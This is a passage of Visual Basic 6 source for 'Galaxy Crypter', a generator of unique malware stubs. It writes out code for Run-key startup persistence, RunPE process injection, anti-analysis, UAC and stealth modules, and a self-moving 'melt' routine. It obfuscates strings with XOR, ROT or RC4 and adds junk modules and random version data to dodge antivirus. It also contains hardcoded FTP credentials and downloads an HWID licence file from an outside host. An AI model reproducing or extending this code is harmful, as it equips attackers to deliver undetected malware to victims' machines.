        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "    Set " & RR3 & " = CreateObject(""WScript.Shell"")" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "    " & TxtFunc(12) & " = " & RR3 & ".RegRead(" & RR1 & " & " & RR2 & ")" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "   End Function" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
' AddToStartup
G = G & "Public Function " & TxtFunc(10) & " (" & sPar1 & "  As String, Optional " & sPar2 & "  As String) As Boolean" & vbCrLf
    G = G & "Dim " & StuVar1 & "  As Long, " & StuVar2 & "  As Long, " & StuVar3 & "  As Long" & vbCrLf
 If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
    G = G & "If IsUserAnAdmin() = 1 Then" & vbCrLf
        G = G & "" & StuVar2 & "  = " & Api1 & "(" & H_K_L_M & " , ""Software\Microsoft\Windows\CurrentVersion\Run"", " & StuVar1 & " )" & vbCrLf
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
    G = G & "Else" & vbCrLf
        G = G & "" & StuVar2 & "  = " & Api1 & "(" & H_K_C_U & " , ""Software\Microsoft\Windows\CurrentVersion\Run"", " & StuVar1 & " )" & vbCrLf
    
    If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
    G = G & "End If" & vbCrLf
    G = G & "If " & StuVar2 & "  = 0 Then" & vbCrLf
        
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        G = G & "" & StuVar3 & "  = RegSetValueEx (" & StuVar1 & " , " & sPar1 & " , 0, " & Reg_SZ & " , ByVal " & sPar2 & " , Len(" & sPar2 & " ))" & vbCrLf
        G = G & "If " & StuVar3 & "  = 0 Then" & vbCrLf
            G = G & "" & TxtFunc(10) & "  = True" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        G = G & "End If" & vbCrLf
    G = G & "End If" & vbCrLf
  If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
    G = G & "RegCloseKey (" & StuVar1 & " )" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "End Function" & vbCrLf

m_Registry = G

End Function

Private Sub BeginGen()
               
Dim sPath As String
    sPath = Environ("tmp") & "\Galaxy Stub"
    
    If DirExists(sPath) Then KillFolder (sPath)
    MkDir (sPath)
                   
Sleep (500)
        
Call TransferCode(sPath & "\" & TxtProj.Text & ".vbp", Project_Info)

Call TransferCode(sPath & "\" & TxtMod(0).Text & ".bas", M_Begin)
Sleep (500)
Call TransferCode(sPath & "\" & TxtMod(1).Text & ".bas", M_Public)

        PB.Value = 66
        PB.Text = "     " & "[Transferring Data]..." & " " & PB.Value & "%"

        PB.Value = 69
        PB.Text = "     " & "[Transferring Data]..." & " " & PB.Value & "%"
        PB.Value = 75
        PB.Text = "     " & "[Transferring Data]..." & " " & PB.Value & "%"

        PB.Value = 79

If Check17.Value = 1 Then
    Call TransferCode(sPath & "\" & TxtMod(2).Text & ".bas", m_Anti)
    PB.Text = "     " & "Producing Runtime Options [Antis]..." & " " & PB.Value & "%"
End If

Call TransferCode(sPath & "\" & TxtCls(4).Text & ".cls", M_Runpe)
    
    PB.Value = 85
    PB.Text = "     " & "Producing Injection Code [RunPe]..." & " " & PB.Value & "%"

If Check19.Value = 1 Then
    Call TransferCode(sPath & "\" & TxtMod(4).Text & ".bas", m_UAC)
End If

        PB.Value = 92

If Check26.Value = 1 Then
Call TransferCode(sPath & "\" & TxtMod(3).Text & ".bas", M_Stealth)
End If
       
Call TransferCode(sPath & "\" & TxtMod(5).Text & ".bas", m_RC41)
        
        PB.Value = 93
        PB.Text = "     " & "Generating Code [Algorithm]..." & " " & PB.Value & "%"

Sleep (500)

    If Check10.Value = 1 Then
        For z = 1 To FlatEdit1.Text
            Call TransferCode(sPath & "\" & RandomCls(z).Text & ".cls", GenCls(RandomCls(z).Text))
        Next z
    End If
        
        PB.Text = "     " & "Generating Code [Fake Modules - 30 Seconds Remaining]..." & " " & PB.Value & "%"

Sleep (500)

    If Check2.Value = 1 Then
        For z = 1 To FlatEdit2.Text
            Call TransferCode(sPath & "\" & RandomMod(z).Text & ".bas", GenMod(RandomMod(z).Text))
        Next z
    End If
    
        PB.Text = "     " & "Finalizing [Preparing Strings For Encryption]..." & " " & PB.Value & "%"
        PB.Value = 95
    
Sleep (500)

    If Check22.Value = 1 Then
        For z = 1 To FlatEdit4.Text
            Call TransferCode(sPath & "\" & RandomCtl(z).Text & ".ctl", User_ControlData(RandomCtl(z).Text))
        Next z
    End If
           
    Sleep (500)
        
    If Check25.Value = 1 Then
        For z = 1 To FlatEdit6.Text
            Call TransferCode(sPath & "\" & RandomPge(z).Text & ".pag", PropPage1(RandomPge(z).Text))
        Next z
    End If
    
Sleep (500)
    
        PB.Value = 98
    
'Encrypt Strings ******************************************************************************************************************************
    
For i = 0 To 4
DoEvents
Call GetData(sPath & "\" & TxtMod(i).Text & ".bas")
PB.Value = PB.Value + 1
Sleep (1000)

Next i

DoEvents
Call GetData(sPath & "\" & TxtCls(4) & ".cls")
 PB.Value = PB.Value + 1
 Sleep (500)
 
DoEvents
Call GetData(sPath & "\" & TxtCls(5) & ".cls")
PB.Value = PB.Value + 1
Sleep (500)

PB.Value = 99

PB.Text = "     " & "Compiling Code [Compiling Stub]..." & " " & PB.Value & "%"

Dim Buffer() As Byte
   
   Buffer = LoadResData(101, "custom")
   Open sPath & "\Vb6Files.exe" For Binary As #3
        Put #3, , Buffer()
    Close #3
          
X = """"
    ShellExecute 0, "open", sPath & "\Vb6Files.exe", 0, sPath, 0
    Sleep (2000)
    
      
    Shell sPath & "\Vb6.exe" & " /m " & X & sPath & "\" & TxtProj.Text & ".vbp" & X, vbHide

    PB.Value = PB.Max
      
    PB.Text = "     " & "Generating Code [Generation Complete!]..."
     
Sleep (2000)
    
    MoveFile sPath & "\" & text18.Text & ".exe", App.Path & "\" & text18.Text & ".exe"

Sleep (1000)

    If Fileexists(App.Path & "\" & text18.Text & ".exe") = False Then
    
        MsgBox "An unexpected error occured. This will not count towards one of your stub generations.", _
        vbInformation, _
        "Galaxy Stub Gen."
        
        Exit Sub
    End If
   
    Conv_IniVal = Conv_IniVal - 1
    IniVal = Chr$(34) & Conv_IniVal & Chr$(34)

Hwid1 = Replace(Hwid1, "[", vbNullString)
Hwid1 = Replace(Hwid1, "]", vbNullString)
WriteIniValue Environ$("Tmp") & "\UsageAdd1.ini", Hwid1, "Number Of Stubs", IniVal

Form1.Caption = "Galaxy Crypter Automatic Unique Stub Generator"
Form1.Caption = Form1.Caption & "                   " & "Uses Remaining: " & Conv_IniVal

'Call Upload_INI

    MsgBox "Unique stub created by: Galaxy Unique Stub Gen " + S1 + _
            "Unique stub directory: " + App.Path & "\" & text18.Text & ".exe" & vbCrLf & _
            "Uses Remaining: " & Conv_IniVal, _
            vbInformation, _
            "Unique Stub Created"
    
End Sub

Private Sub TransferCode(CodePath As String, sData As Variant)
DoEvents
Open CodePath For Append As #4
Print #4, sData
Close #4

End Sub

Private Sub LoseSource(sPath As String)
On Error Resume Next

If DirExists(sPath) Then KillFolder sPath
    
End Sub

Private Sub DeleteSource(srcPath As String)

DoEvents
If Fileexists(srcPath) Then Kill (srcPath)

End Sub

Private Sub GetData(sPath As String)
On Local Error Resume Next
Rich4.Text = ""

Dim sData1 As String
Open sPath For Binary As #6
sData1 = Space(LOF(6))
Get #6, , sData1
Close #6

Buscar_Cadenas (sData1)

Open sPath For Output As #6
Close #6

Open sPath For Append As #6
Print #6, Rich4.Text
Close #6

End Sub
Public Function Buscar_Cadenas(hText As String)

Dim hTemp() As String
Dim hString() As String
Dim sData As String
Dim hCount As Long
Dim i, K As Long
Dim Crypted_String As String

Sleep (500)

If Not Trim$(hText) = vbNullString Then

hTemp() = Split(hText, vbNewLine)

    For i = 0 To UBound(hTemp)  ' Full Line
    
    DoEvents

        If NonString(hTemp(i)) = True Then GoTo NextLine
        If InStr(hTemp(i), """""""") Then GoTo NextLine
        
If InStr(1, hTemp(i), Chr$(34)) Then

hString() = Split(hTemp(i), Chr$(34))


For K = 1 To UBound(hString) Step 2

    DoEvents
    
        If NonQuote(hString(K)) = True Then GoTo NextQuote
        If Trim$(hString(K)) = vbNullString Then GoTo NextLine
        If Dc1(hString(K)) = True Then GoTo NextLine

        hTemp(i) = Replace(hTemp(i), Chr$(34) + hString(K) + Chr$(34), hString(K))

' =================================================================================================================================================================================================================
'                                                XOR
' =================================================================================================================================================================================================================
If ComboBox1(8).ListIndex = 0 Then
        hTemp(i) = Replace(hTemp(i), hString(K), XorName + "(""" + qojtokqvn(hString(K)) + """," & Chr$(34) & RandomXorKey & Chr$(34) & ")")

            If CheckBox2.Value = xtpChecked Then
            
                hTemp(i) = Replace(hTemp(i), Chr$(34) + qojtokqvn(hString(K)) + Chr$(34), qojtokqvn(hString(K)))

                If ComboBox1(7).ListIndex = 0 Then
                    hTemp(i) = Replace(hTemp(i), qojtokqvn(hString(K)), ConvertToCharVal(qojtokqvn(hString(K))))
                Else
                    hTemp(i) = Replace(hTemp(i), qojtokqvn(hString(K)), HexName + "(""" + StringToHex(qojtokqvn(hString(K))) + """)")
                End If
            End If
End If

' =================================================================================================================================================================================================================
'                                                ROTX
' =================================================================================================================================================================================================================

If ComboBox1(8).ListIndex = 1 Then
        hTemp(i) = Replace(hTemp(i), hString(K), RotName + "(""" + RotX(hString(K), RotNumber) + """)")
        
            If CheckBox2.Value = xtpChecked Then
                
                    hTemp(i) = Replace(hTemp(i), Chr$(34) + RotX(hString(K), RotNumber) + Chr$(34), RotX(hString(K), RotNumber))

                    hTemp(i) = Replace(hTemp(i), RotX(hString(K), RotNumber), ConvertToCharVal(RotX(hString(K), RotNumber)))
             
            End If
End If

' =================================================================================================================================================================================================================
'                                                RC4
' =================================================================================================================================================================================================================

If ComboBox1(8).ListIndex = 2 Then

Rc4_Pass = GenNumKey(RandomNumber(15, 9), 5)

Sleep (100)

        hTemp(i) = Replace(hTemp(i), hString(K), TxtFunc(9).Text + "(" + """" + RC4(hString(K), Rc4_Pass) + """" + "," + """" + Rc4_Pass + """" + ")")
        
            If CheckBox2.Value = xtpChecked Then
            
            hTemp(i) = Replace(hTemp(i), Chr$(34) + RC4(hString(K), Rc4_Pass) + Chr$(34), RC4(hString(K), Rc4_Pass))
            hTemp(i) = Replace(hTemp(i), Chr$(34) + Rc4_Pass + Chr$(34), Rc4_Pass)

                If ComboBox1(7).ListIndex = 0 Then
                    hTemp(i) = Replace(hTemp(i), RC4(hString(K), Rc4_Pass), ConvertToCharVal(RC4(hString(K), Rc4_Pass)))
                Else
                    hTemp(i) = Replace(hTemp(i), RC4(hString(K), Rc4_Pass), HexName + "(""" + StringToHex(RC4(hString(K), Rc4_Pass)) + """)")
                End If
           End If
           
            hTemp(i) = Replace(hTemp(i), Rc4_Pass, Chr$(34) + Rc4_Pass + Chr$(34))
End If

NextQuote:

    Next K
      
NextLine:

End If
 
 Rich4.Text = Rich4.Text & hTemp(i) & vbCrLf
 
Next i

Sleep (200)

End If


End Function
Public Function StringToHex(ByVal StrToHex As String) As String
Dim StrTemp   As String
Dim strReturn As String
Dim i         As Long
    For i = 1 To Len(StrToHex)
        StrTemp = Hex$(Asc(Mid$(StrToHex, i, 1)))
        If Len(StrTemp) = 1 Then StrTemp = "0" & StrTemp
        strReturn = strReturn & StrTemp
    Next i
    StringToHex = strReturn
End Function
Private Function ConvertToCharVal(Text As String) As String
    
    Dim i As Integer
    Dim FinalStr As String

        FinalStr = ""
        
        'Initiate the loop
        For i = 1 To Len(Text)
            FinalStr = FinalStr + "Chr("
            FinalStr = FinalStr + CStr(Asc(Mid(Text, i, 1)))
            FinalStr = FinalStr + ") + "
        
        Next i
            'Once we have reached the end of the text
            FinalStr = Left$(FinalStr, Len(Trim(FinalStr)) - 1)
            FinalStr = Trim$(FinalStr)
            ConvertToCharVal = FinalStr

End Function
Private Function Dc1(sData As String) As Boolean

Dim x1 As Boolean
If Trim$(sData) = "," Then x1 = True
If x1 = True Then Dc1 = True

End Function


Function NonQuote(sData As String) As Boolean

Dim OddPresent As Boolean

For i = 0 To 10
DoEvents
If InStr(sData, i) Then OddPresent = True
Next i

If OddPresent = True Then
Sleep (200)
NonQuote = True
End If

End Function

Private Function NonString(sData As String) As Boolean

Dim OddPresent As Boolean

If InStr(LCase$(sData), "function") Then OddPresent = True
If InStr(LCase$(sData), "sub") Then OddPresent = True
If InStr(LCase$(sData), "lib") Then OddPresent = True
If InStr(LCase$(sData), "declare") Then OddPresent = True
If InStr(LCase$(sData), "vb_name") Then OddPresent = True
If InStr(LCase$(sData), "const") Then OddPresent = True
If InStr(LCase$(sData), "msgbox") Then OddPresent = True
If InStr(LCase$(sData), TxtFunc(9)) Then OddPresent = True
If InStr(LCase$(sData), "app.path") Then OddPresent = True
If InStr(sData, "MoveFile") Then OddPresent = True
If InStr(sData, "CopyFile") Then OddPresent = True
If InStr(sData, "StrData") Then OddPresent = True
If InStr(LCase$(sData), "hwnd") Then OddPresent = True
If InStr(LCase$(sData), "kill") Then OddPresent = True

If OddPresent Then NonString = True

End Function
Public Function KillFolder(ByVal FullPath As String) As Boolean
   
On Error Resume Next
Dim oFso As New Scripting.FileSystemObject

If oFso.FolderExists(FullPath) Then
    oFso.DeleteFolder FullPath, True
    KillFolder = Err.Number = 0 And _
    oFso.FolderExists(FullPath) = False
End If

End Function
Private Function m_BinderVars()

    Dim a As String

    a = a + "Private sub " + TxtSub(3) & vbCrLf
    a = a + "DoEvents" & vbCrLf
    a = a + "if " + Dec(6) + " = 1 then " + Dec(6) + " = app.path " & vbCrLf
    a = a + "if " + Dec(6) + " = 2 then " + Dec(6) + " = Environ(""Windir"") " & vbCrLf
    a = a + "if " + Dec(6) + " = 3 then " + Dec(6) + " = Environ(""SystemDrive"") " & vbCrLf
    a = a + "if " + Dec(6) + " = 4 then " + Dec(6) + " = Environ(""Temp"") " & vbCrLf
    a = a + "if " + Dec(6) + " = 5 then " + Dec(6) + " = Environ(""AppData"") " & vbCrLf
    a = a + "if " + Dec(6) + " = 6 then " + Dec(6) + " = Environ(""Windir"") & ""\System32"" " & vbCrLf
    a = a + "if " + Dec(6) + " = 1 then " + Dec(7) + " = Environ(""ProgramFiles"") " & vbCrLf
    a = a + "End sub" & vbCrLf

m_BinderVars = a

End Function


Public Function M_melt()

    Dim a As String
   
    a = a + "Private Sub " + TxtSub(7) & vbCrLf
    a = a + "If " + TxtSub(4) + "(Environ$(""Temp"") & ""\TempIEData.exe"") then kill Environ$(""Temp"") & ""\TempIEData.exe""" & vbCrLf
    a = a + "MoveFile " & TxtFunc(13) & ", Environ(""Temp"") & ""\TempIEData.exe""" & vbCrLf
    a = a + "End sub" & vbCrLf
    M_melt = a

End Function

Public Function m_fExists()

    Dim a         As Integer
    Dim FexistsVar1      As String
    
    FexistsVar1 = GenNumKey(RandomNumber(15, 5))
    
        a = a + "Private Sub " + TxtSub(4) + "(" + FexistsVar1 + " as string)" & vbCrLf
        a = a + "if dir(" + FexistsVar1 + ") <> "" then " & vbCrLf
        a = a + TxtSub(4) + " = true " & vbCrLf
        a = a + "else" & vbCrLf
        a = a + TxtSub(4) + " = false " & vbCrLf
        a = a + "End Function"
        
        m_fExists = a

End Function

Private Sub Command4_Click()

For X = 1 To 75

DoEvents

Call Randomize

Dim IntA As Integer, IntB As Integer, IntC As Integer, IntD As Integer
Dim IntE As Integer, IntF As Integer, IntG As Integer, IntH As Integer
Dim IntI As Integer, IntJ As Integer, IntK As Integer, IntL As Integer
Dim IntM As Integer, IntN As Integer, IntO As Integer, IntP As Integer
Dim IntQ As Integer, IntR As Integer, IntS As Integer, IntT As Integer
Dim IntU As Integer, IntV As Integer

Txt1 = RandomNumber(90)
text2 = RandomNumber(90)
Text3 = RandomNumber(90)
Text4.Text = GenNumKey(25)
Text5.Text = GenNumKey(25)
text6.Text = GenNumKey(25)
Text7.Text = GenNumKey(12)
Text9.Text = GenNumKey(20)
Text11.Text = GenNumKey(25)
text18.Text = GenNumKey(20)
Text19.Text = GenNumKey(12)
Text20.Text = GenNumKey(20)
text21.Text = GenNumKey(12)

IntA = RandomNumber(3)
IntB = RandomNumber(3)
IntC = RandomNumber(3)
IntD = RandomNumber(3)
IntE = RandomNumber(3)
IntF = RandomNumber(3)
IntG = RandomNumber(3)
IntH = RandomNumber(3)
IntI = RandomNumber(3)
IntJ = RandomNumber(3)
IntK = RandomNumber(3)
IntL = RandomNumber(3)
IntM = RandomNumber(3)
IntN = RandomNumber(3)
IntO = RandomNumber(3)
IntP = RandomNumber(3)
IntQ = RandomNumber(3)
IntR = RandomNumber(3)
IntS = RandomNumber(3)

Randomize
IntT = CInt(1 * Rnd)
Randomize
IntU = CInt(2 * Rnd)
Randomize
IntV = CInt(2 * Rnd)

ComboBox1(7).ListIndex = IntT
ComboBox1(8).ListIndex = IntU
CheckBox2.Value = IntV

    If IntA = 1 Then Check7.Value = 1: ComboBox1(0).ListIndex = Int(Rnd * 3) Else Check7.Value = 0
    If IntB = 1 Then Check8.Value = 1: ComboBox1(1).ListIndex = Int(Rnd * 3) Else Check8.Value = 0
    If IntC = 1 Then Check9.Value = 1: ComboBox1(2).ListIndex = Int(Rnd * 3) Else Check9.Value = 0
    If IntD = 1 Then Check11.Value = 1: ComboBox1(3).ListIndex = Int(Rnd * 3) Else Check11.Value = 0
    If IntE = 1 Then Check14.Value = 1: ComboBox1(4).ListIndex = Int(Rnd * 3) Else Check14.Value = 0
    
If IntJ = 1 Then Check15.Value = 1 Else Check15.Value = 0
If IntK = 1 Then Check17.Value = 1 Else Check17.Value = 0
If IntM = 1 Then Check19.Value = 1 Else Check19.Value = 0
If IntN = 1 Then Check20.Value = 1: ComboBox1(5).ListIndex = Int(Rnd * 3) Else Check20.Value = 0
If IntO = 1 Then Check21.Value = 1: ComboBox1(6).ListIndex = Int(Rnd * 3) Else Check21.Value = 0

    If IntF = 1 Then
        Check10.Value = 1
        FlatEdit1.Text = RandomNumber(10)
    Else
        Check10.Value = 0
    End If
    
    If IntG = 1 Then
        Check2.Value = 1
        FlatEdit2.Text = RandomNumber(10)
    Else
        Check2.Value = 0
    End If
    
      If IntH = 1 Then
        Check16.Value = 1
        FlatEdit3.Text = RandomNumber(10)
    Else
        Check16.Value = 0
    End If
    
   
    If IntI = 1 Then
        Check22.Value = 1
        FlatEdit4.Text = RandomNumber(6)
    Else
        Check22.Value = 0
    End If
    
    If IntR = 1 Then
        Check25.Value = 1
        FlatEdit6.Text = RandomNumber(6)
    Else
        Check25.Value = 0
    End If
    
Next

End Sub

Private Sub Command5_Click()
Randomize
Retry:
FlatEdit2.Text = Int(Rnd * 10)
If FlatEdit2.Text = "0" Then GoTo Retry
End Sub

Private Sub Command6_Click()
Randomize
Retry:
FlatEdit3.Text = Int(Rnd * 10)
If FlatEdit3.Text = "0" Then GoTo Retry
End Sub

Private Sub Command7_Click()
Randomize
Retry:
FlatEdit4.Text = Int(Rnd * 6)
If FlatEdit4.Text = "0" Then GoTo Retry
End Sub

Private Sub Command9_Click()

Randomize
Retry:
FlatEdit6.Text = Int(Rnd * 6)
If FlatEdit6.Text = "0" Then GoTo Retry
End Sub

Private Sub FlatEdit1_Change()
If IsNumeric(FlatEdit1.Text) = False Then FlatEdit1.Text = ""
End Sub

Private Sub FlatEdit2_Change()
If IsNumeric(FlatEdit2.Text) = False Then FlatEdit2.Text = ""
End Sub

Private Sub Form_Load()

Check7.Value = 1
Check8.Value = 1
Check9.Value = 1
Check11.Value = 1
Check20.Value = 1
Check21.Value = 1
Check14.Value = 1
 
Form1.Show


 Dim md5 As New Md5Login

'On Error Resume Next

Dim sPathUser       As String
Dim strCodeKey      As String
Dim enchwid         As String
Dim salt1           As String
Dim XorString       As String
Dim WebSite         As String
Dim StrTemp         As String
Dim lRet            As Long


txtHost.Text = "ftp://ftp.host3266.net"
txtUserName = "CodersCentral@host3266.net"
txtPassword.Text = "At3safety"

    ' Check if HWID matches:
DoEvents
   lRet = URLDownloadToFile(0, "http://host3266.net/coderscentral/HWID1.txt", Environ("Temp") & "\Hwid1.txt", 0, 0)

    Hwid1 = CREATEID()
    Hwid1 = dbvgbwdiz(Hwid1)
    Hwid1 = md5.DigestStrToHexStr(Hwid1)

    Open Environ("Temp") & "\Hwid1.txt" For Input As #1

        Do
            Line Input #1, StrTemp
              If InStr(StrTemp, Hwid1) Then
                Close #1
                m_Access = True
                GoTo ResumeLogin
             End If

        Loop Until EOF(1)
        
        MsgBox "This computer is not authorized to run Galaxy Crypter!", vbCritical + vbOKOnly, "Access Denied!"
        End

ResumeLogin:

DoEvents
'Call Download_INI

If Fileexists(Environ$("Tmp") & "\UsageAdd1.ini") Then
Else

    lRet = URLDownloadToFile(0, "http://host3266.net/coderscentral/StubValues.ini", Environ$("Tmp") & "\UsageAdd1.ini", 0, 0)
End If

    IniVal = ReadIniValue(Environ$("Tmp") & "\UsageAdd1.ini", Hwid1, "Number Of Stubs")
    If IniVal = "" Then
        Conv_IniVal = 3
    Else: IniVal = Replace(IniVal, """", "")
    Conv_IniVal = IniVal
    End If

Hwid1 = Replace(Hwid1, "[", vbNullString)
Hwid1 = Replace(Hwid1, "]", vbNullString)

Call Randomize

'Progress Bar
PB.Max = 110
PB.Value = 1

Txt1 = 1
text2 = 0
Text3 = 0

ComboBox1(7).AddItem "Chr$"
ComboBox1(7).AddItem "String To Hex"
ComboBox1(7).ListIndex = "0"

ComboBox1(8).AddItem "Xor"
ComboBox1(8).AddItem "Rotx"
ComboBox1(8).AddItem "RC4"
ComboBox1(8).ListIndex = "0"

For i = 0 To 6
ComboBox1(i).AddItem "Low"
ComboBox1(i).AddItem "Medium"
ComboBox1(i).AddItem "High"
ComboBox1(i).ListIndex = 1
Next i

If Conv_IniVal = 0 Then
Form1.Caption = Form1.Caption & "                   " & "Uses Remaining: 0"
ElseIf IsNumeric(Conv_IniVal) = False Then Form1.Caption = Form1.Caption & "                   " & "Uses Remaining: 0"
Else: Form1.Caption = Form1.Caption & "                   " & "Uses Remaining: " & Conv_IniVal
End If

App_Path = "App.Path & ""\"" & App.EXEName & "".exe"""
       
 
End Sub

Public Function Fileexists(fName) As Boolean
   If Dir(fName) <> "" Then _
   Fileexists = True _
   Else: Fileexists = False
End Function

Public Function User_ControlData(UserCtlName As String) As String

Dim a As String

a = a + "Version 5.00" & vbCrLf
a = a + "Begin VB.UserControl = " + UserCtlName + S1
a = a + "ClientHeight = 3600" & vbCrLf
a = a + "ClientLeft = 0" & vbCrLf
a = a + "ClientTop = 0" & vbCrLf
a = a + "ClientWidth = 4800" & vbCrLf
a = a + "ScaleHeight = 3600" & vbCrLf
a = a + "ScaleWidth = 4800" & vbCrLf
a = a + "End" & vbCrLf
a = a + "Attribute VB_Name = " + """" + UserCtlName + """" & vbCrLf
a = a + "Attribute VB_GlobalNameSpace = False" & vbCrLf
a = a + "Attribute VB_Creatable = True" & vbCrLf
a = a + "Attribute VB_PredeclaredId = False" & vbCrLf
a = a + "Attribute VB_Exposed = False" & vbCrLf


User_ControlData = a

End Function

Function PropPage1(PageName As String) As String

Dim a As String

a = a + "Version 5.00" & vbCrLf
a = a + "Begin VB.PropertyPage = " & PageName & vbCrLf
   a = a + "Caption = ""PropertyPage1""" & vbCrLf
   a = a + "ClientHeight = 3600" & vbCrLf
   a = a + "ClientLeft = 0" & vbCrLf
   a = a + "ClientTop = 0" & vbCrLf
   a = a + "ClientWidth = 4800" & vbCrLf
   a = a + "PaletteMode = 0" & vbCrLf
   a = a + "ScaleHeight = 3600" & vbCrLf
   a = a + "ScaleWidth = 4800" & vbCrLf
a = a + "End" & vbCrLf
a = a + "Attribute VB_Name = " + """" + PageName + """" + S1
a = a + "Attribute VB_GlobalNameSpace = False" & vbCrLf
a = a + "Attribute VB_Creatable = False" & vbCrLf
a = a + "Attribute VB_PredeclaredId = False" & vbCrLf
a = a + "Attribute VB_Exposed = False" & vbCrLf

PropPage1 = a

End Function

Public Function Project_Info() As String
    
    Project_Info = "Type=Exe" & vbNewLine & _
    "Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\WINDOWS\system32\stdole2.tlb#OLE Automation" & vbNewLine & _
    "Module=" & TxtMod(0).Text & "; " & TxtMod(0).Text & ".bas" & vbNewLine & _
    "Module=" & TxtMod(1).Text & "; " & TxtMod(1).Text & ".bas" & vbNewLine & _
    "Module=" & TxtMod(2).Text & "; " & TxtMod(2).Text & ".bas" & vbNewLine & _
    "Module=" & TxtMod(3).Text & "; " & TxtMod(3).Text & ".bas" & vbNewLine & _
    "Module=" & TxtMod(4).Text & "; " & TxtMod(4).Text & ".bas" & vbNewLine & _
    "Module=" & TxtMod(5).Text & "; " & TxtMod(5).Text & ".bas" & vbNewLine & _
    "Reference=*\G{7C0FFAB0-CD84-11D0-949A-00A0C91110ED}#1.0#0#..\..\WINDOWS\system32\msdatsrc.tlb#Microsoft Data Source Interfaces" & vbNewLine & _
    "Class=" & TxtCls(4).Text & "; " & TxtCls(4).Text & ".cls" & vbNewLine
    
    If Check10.Value = 1 Then
        For z = 1 To FlatEdit1.Text
            Project_Info = Project_Info & "Class=" & RandomCls(z).Text & "; " & RandomCls(z).Text & ".cls" & vbCrLf
        Next z
    End If
    
    If Check2.Value = 1 Then
        For z = 1 To FlatEdit2.Text
            Project_Info = Project_Info & "Module=" & RandomMod(z).Text & "; " & RandomMod(z).Text & ".bas" & vbCrLf
        Next z
    End If
    
    If Check22.Value = 1 Then
        For z = 1 To FlatEdit4.Text
            Project_Info = Project_Info & "UserControl=" & RandomCtl(z).Text & ".ctl" & vbCrLf
        Next z
    End If
    
    If Check25.Value = 1 Then
        For z = 1 To FlatEdit6.Text
            Project_Info = Project_Info & "PropertyPage=" & RandomPge(z).Text & ".pag" & vbCrLf
        Next z
    End If

    Project_Info = Project_Info & "Startup =" & """" & "Sub Main" & """" & vbNewLine & _
    "HelpFile =" & """" & """" & vbNewLine & _
    "Title =" & """" & Text7.Text & """" & vbNewLine & _
    "ExeName32 =" & """" & text18.Text & ".exe" & """" & vbNewLine & _
    "Path32 = " & """" & "..\.." & """" & vbNewLine & _
    "Command32 =" & """" & """" & vbNewLine & _
    "Name =" & """" & Text19.Text & """" & vbNewLine & _
    "HelpContextID =" & """" & "0" & """" & vbNewLine & _
    "CompatibleMode =" & """" & "0" & """" & vbNewLine

    Sleep 500

    Project_Info = Project_Info & "MajorVer =" & Txt1.Text & vbNewLine & _
    "MinorVer =" & Text3.Text & vbNewLine & _
    "RevisionVer =" & text2.Text & vbNewLine & _
    "AutoIncrementVer =" & RandomNumber(15) & vbNewLine & _
    "ServerSupportFiles =0" & vbNewLine & _
    "VersionCompanyName =" & """" & Text5.Text & """" & vbNewLine & _
    "VersionComments =" & """" & text6.Text & """" & vbNewLine & _
    "VersionFileDescription=" & """" & Text11.Text & """" & vbNewLine & _
    "VersionLegalTrademarks=" & """" & Text20.Text & """" & vbNewLine & _
    "VersionLegalCopyright=" & """" & Text4.Text & """" & vbNewLine & _
    "VersionProductName=" & """" & Text19.Text & """" & vbNewLine


If Option2.Value = True Then
Project_Info = Project_Info & "CompilationType =-1" & vbNewLine
Else
Project_Info = Project_Info & "CompilationType =0" & vbNewLine
End If
Project_Info = Project_Info & "OptimizationType =0" & vbNewLine & _
"FavorPentiumPro(tm) =0" & vbNewLine & _
"CodeViewDebugInfo =0" & vbNewLine & _
"NoAliasing =0" & vbNewLine & _
"BoundsCheck =0" & vbNewLine & _
"OverflowCheck =0" & vbNewLine & _
"FlPointCheck =0" & vbNewLine & _
"FDIVCheck =0" & vbNewLine & _
"UnroundedFP =0" & vbNewLine & _
"StartMode =0" & vbNewLine & _
"Unattended =0" & vbNewLine & _
"Retained =0" & vbNewLine & _
"ThreadPerObject =0" & vbNewLine & _
"MaxNumberOfThreads =1" & vbNewLine & vbNewLine & _
"[MS Transaction Server]" & vbNewLine & _
"AutoRefresh =1" & vbNewLine
End Function

Private Function m_RC4()

    Dim a   As String
    
    Dim Rc_Var1 As String ' m_Key
    Dim Rc_Var2 As String ' m_sbox
    Dim Rc_Var3 As String ' byteArray
    Dim Rc_Var4 As String ' hiByte
    Dim Rc_Var5 As String ' hibound
    Dim Rc_Var6 As String ' Infile
    Dim Rc_Var7 As String ' OutFile
    Dim Rc_Var8 As String ' Overwrite
    Dim Rc_Var9 As String ' Key
    Dim Rc_Var10 As String ' errorhandler
    Dim Rc_Var11 As String ' FileO
    Dim Rc_Var12 As String ' Buffer -- ()
    Dim Rc_Var13 As String ' Text
    Dim Rc_Var14 As String ' OutputInHex
    Dim Rc_Var16 As String ' IsTextInHex
    Dim Rc_Var17 As String ' DeHex
    Dim Rc_Var18 As String ' EnHex
    
    RndStrings Rc_Var1
    RndStrings Rc_Var2
    RndStrings Rc_Var3
    RndStrings Rc_Var4
